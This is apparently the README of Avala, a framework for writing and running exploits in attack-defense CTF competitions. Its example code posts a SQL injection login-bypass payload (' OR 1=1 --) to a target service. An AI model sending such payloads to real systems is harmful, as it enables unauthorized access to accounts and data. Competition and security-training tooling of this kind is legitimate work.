<div align="center">
<img src="https://raw.githubusercontent.com/dusanlazic/avala/refs/heads/develop/docs/docs/assets/logo.svg" width="400">
<h3>Develop and run exploits rapidly in A/D</h3>
<a href="https://github.com/dusanlazic/avala/actions/workflows/build.yaml"><img alt="Build (PR develop -> release)" src="https://img.shields.io/github/actions/workflow/status/dusanlazic/avala/build.yaml?logo=github"></a>
<a href="https://pypi.org/project/avala-ad/"><img src="https://img.shields.io/pypi/v/avala-ad?logo=pypi&label=client&color=%233775A9"></a>
<a href="https://hub.docker.com/repository/docker/dusanlazic/avala-server/"><img src="https://img.shields.io/docker/v/dusanlazic/avala-server?logo=docker&label=server&color=%232496ED"></a>
<a href="https://hub.docker.com/repository/docker/dusanlazic/avala-submitter/"><img src="https://img.shields.io/docker/v/dusanlazic/avala-submitter?logo=docker&label=submitter&color=%232496ED"></a>
<a href="https://github.com/dusanlazic/avala/blob/release/LICENCE"><img src="https://img.shields.io/github/license/dusanlazic/avala?color=F01E39"></a>
<a href="https://github.com/dusanlazic/avala"><img src="https://img.shields.io/github/stars/dusanlazic/avala"></a>
<br>
</div>

---

**Avala** is a specialized tool built for rapid **developing, running and monitoring exploits** in attack-defense CTF competitions. The goal of Avala is to take the technical burden off the team players, enabling them to focus on exploiting and patching vulnerabilities. 

```py
from avala import exploit
import json
import requests


@exploit(service="foobar")
def attack(target: str, flag_ids: str):
    url = f"http://{target}:5000/login"
    username = json.loads(flag_ids)["username"]

    payload = {"username": username, "password": "' OR 1=1 --"}
    response = requests.post(url, json=payload)

    return response.text
```

Development of Avala is heavily influenced by the practical experiences and valuable insights gathered by the **Serbian National ECSC Team** 🇷🇸, who use the tool in major A/D competitions such as **European Cyber Security Challenge**, **FAUST CTF**, **ENOWARS**, and more.

## Documentation

Documentation is available at [lazicdusan.com/avala](https://lazicdusan.com/avala).
